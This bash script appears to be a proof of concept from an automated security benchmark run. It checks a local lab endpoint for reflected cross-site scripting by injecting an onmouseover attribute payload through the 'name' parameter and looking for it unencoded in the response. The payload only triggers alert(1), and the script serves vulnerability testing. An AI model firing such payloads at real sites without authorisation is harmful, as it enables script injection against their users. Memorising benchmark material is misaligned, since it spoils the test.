#!/bin/bash
# POC: Demonstrates reflected XSS vulnerability via attribute injection in the 'name' parameter on http://localhost:5000/xss10
# Target: ./repo
# Created: 2025-11-04T19:24:45.093Z
# Session: benchmark-XBEN-017-24-mhkyddgz

# XSS Attribute Injection POC - Version 2
# Tests reflected XSS vulnerability in the 'name' parameter on http://localhost:5000/xss10

TARGET_URL="http://localhost:5000/xss10"

# URL encode the payload
PAYLOAD_ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('\" onmouseover=\"alert(1)'))")

echo "[*] Testing Reflected XSS via Attribute Injection"
echo "[*] Target: $TARGET_URL"
echo "[*] Payload (encoded): $PAYLOAD_ENCODED"
echo ""

# Make the request
RESPONSE=$(curl -s -m 10 "$TARGET_URL?name=$PAYLOAD_ENCODED")

# Check the response
if [ -z "$RESPONSE" ]; then
    echo "[-] No response from server"
    exit 1
fi

# Look for the unencoded event handler in the response
if echo "$RESPONSE" | grep -q 'onmouseover="alert'; then
    echo "[+] VULNERABLE: Event handler injected successfully!"
    echo "[+] The application reflects user input without proper HTML encoding"
    echo ""
    echo "Vulnerable response contains:"
    echo "$RESPONSE" | grep -o 'value="[^"]*onmouseover[^"]*"'
    echo ""
    echo "[+] XSS Vulnerability Confirmed"
    exit 0
elif echo "$RESPONSE" | grep -q 'value='; then
    echo "[*] Response received, checking for injection..."
    echo "$RESPONSE" | grep -o 'value="[^"]*"' | head -3
    echo ""
    if echo "$RESPONSE" | grep -q '"'; then
        echo "[!] Response contains quotes but payload may be filtered/encoded"
        exit 1
    fi
else
    echo "[-] Unexpected response format"
    echo "$RESPONSE" | head -20
    exit 1
fi